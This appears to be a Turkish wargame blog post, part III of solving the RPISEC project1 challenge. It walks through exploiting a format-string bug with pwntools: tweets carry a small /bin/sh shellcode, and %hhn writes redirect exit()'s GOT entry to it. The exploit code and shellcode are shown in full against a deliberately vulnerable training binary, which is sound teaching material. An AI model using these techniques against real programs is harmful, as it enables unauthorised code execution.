---
layout: post
title: "Savaş Oyunları: Format İpliklerinin Dönüşü Part III"
category: pwn
date: 18.12.13
---

![imback](/assets/2018-12-13-rpisec_project1_pt3/imback.gif)

*Başladığım işi bitirmek üzere geri döndüm. Geç olsun güç olmasın. (Bahaneler bahaneler...)*

# Adminden kod çalıştırmaya

Admin olmayı başardım ancak bu tek başına birşey ifade etmiyor. Çünkü program admin olan bir kullanıcıya tweetlerin adreslerini göstermekten başka bir fonksiyon sunmuyor. Programda zafiyetler var mı incelemem gerekecek.

İlk aradığım zafiyet türü buffer overflow. Ancak programı yazan kişi gayet iyi yazmış, tüm inputlar bufferların uzunluğuna göre alınıyor. İkinci olarak printf tarzı fonksiyonlarda yanlış kullanım var mı diye ararken sym.print_menu altında dikkatimi şu kısım çekiyor:

![1](/assets/2018-12-13-rpisec_project1_pt3/1.png)

Bu kısım menüdeyken küçük penguenin yanına son girdiğimiz tweeti yazdırıyor. Ancak normal kullanıcı için sağdaki, admin olan kullanıcılar için ise soldaki blok çalışıyor. Küçük bir problem var, soldaki blokta tweetim printf fonksiyonuna ilk argüman olarak veriliyor. Bu da demektir ki:

FORMAT STRING ZAFİYETİ BULDUM!!

Küçük sevinç çığlıklarından sonra bu zafiyeti nasıl kullanacağımı planlamam lazım. İlk deneyeceğim şey GOT tablosundan bir fonksiyonun adresini değiştirip kendi yazdığım shellcode'a yönlendirmek. Bunun için shellcode'umu tweetlerin içinde tutabilirim. Tek sorun, tweetler 16 byte boyutunda. Bütün bunları hesaba katıp kendime bir yol çizdim:

- Shellcode'u tweet olarak programa ver.
   - 16 byte bir shellcode için küçük olacak. "/bin/sh" kısmını önden bir tweete yükleyip kodun kalanını sonraki tweette saklayabilirim.
- Son tweet ile format string zafiyetini kullanıp sym.exit()'in GOT girdisini shellcode'a yönlendir.
- Programdan çıkış yaparak exit() fonksiyonunun çağrılmasını sağla.


## 1. Shellcode'un programa yüklenmesi
Python scriptime debug modunu açıp "/bin/sh" tweetini atan kısmı ekliyorum:

{% highlight python %}
log.info(io.recv())
io.sendline("6")
log.info(io.recvuntil("Enter Choice: "))
io.sendline("1")
# program son karaktere mudahele ediyor
io.sendline("/bin/sh\x00/")
{% endhighlight %}

Hemen ardından tweetin bellekteki adresini okumam gerekecek.

{% highlight python %}
io.recv()
io.sendline("2")
tweet_list = io.recv()
binsh = int(tweet_list.split("\n")[-7].split(" ")[-1], 16)
log.info("binsh address: {}".format(hex(binsh)))
{% endhighlight %}

Şimdi shellcode'umu oluşturup programa verebilirim.

### Zeytinli shellcode tarifi:

{% highlight python %}
shellcode  = "xor ecx, ecx\n"
shellcode += "imul ecx\n"
shellcode += "mov al, 0x0b\n"
shellcode += "mov ebx, 0x{}\n".format(binsh)
shellcode += "int 0x80\n"
shellcode = asm(shellcode)
{% endhighlight %}

13 byte'lık shellcode'um hazır. Şimdi bunu programa yüklüyorum.

{% highlight python %}
io.recv()
io.sendline("1")
io.sendline(shellcode)
io.sendline("")
{% endhighlight %}

Shellcode'umun adresini de okuyorum.

{% highlight python %}
io.recv()
io.sendline("2")
tweet_list = io.recv()

shellcode_address = int(tweet_list.split("\n")[-8].split(" ")[-1], 16)
log.info("Shellcode @{}".format(hex(shellcode_address)))

io.send("\n")
{% endhighlight %}

## 2. Format string zafiyetini kullanarak GOT girdisini değiştirmek

Sırada exit fonksiyonunun GOT girdisini değiştirmek için format string zayifetini kullanmam gerekiyor. Pwntools bunun için hazır fonksiyonlara sahip ama şimdilik kendi kodlarımla idare edeceğim. Ancak yine 16 byte sınırı ile karşı karşıyayım. Birden fazla tweet kullanarak adresi parça parça değiştirmek zorunda kalacağım.

{% highlight python %}
exitgot = binary.got["exit"]
# byte byte yaziyorum
for i in range(4):
    io.recv()
    io.sendline("1")

    # padding gerekli
    line  = "A"
    line += p32(exitgot+i)
    byte2write = (shellcode_address & (0xff << i*8)) >> i*8
    log.info("Writing {} to address {}".format(hex(byte2write),
                                               hex(exitgot+i)))
    byte2write |= 0x100
    byte2write -= len(line)
    line += "%" + str(byte2write) + "x"
    line += "%8$hhn"

    io.sendline(line)
    io.sendline("")

io.interactive()
{% endhighlight %}

## 3. Programdan çıkış(!)

Scriptim buraya kadar çalıştıktan sonra programdan çıkış yapmak istediğimde exit() fonksiyonunu çağırmaya çalışacak ve shellcode'uma düşecek.

![voila](/assets/2018-12-13-rpisec_project1_pt3/2.png)

Ve shellcode çalıştı. Projeyi sonunda tamamladım. Scriptin en son halini [githubda](https://gist.github.com/erfur/40809ac0184070341ee27279ab2402dc) bulabilirsiniz. İlk konular ile alakalı bir proje olduğu için güncel korumaların hepsi kapalıydı (ASLR dahil). İleride daha güncel yöntemlerin kullanıldığı projelerde görüşmek üzere.

Connection closed by foreign host.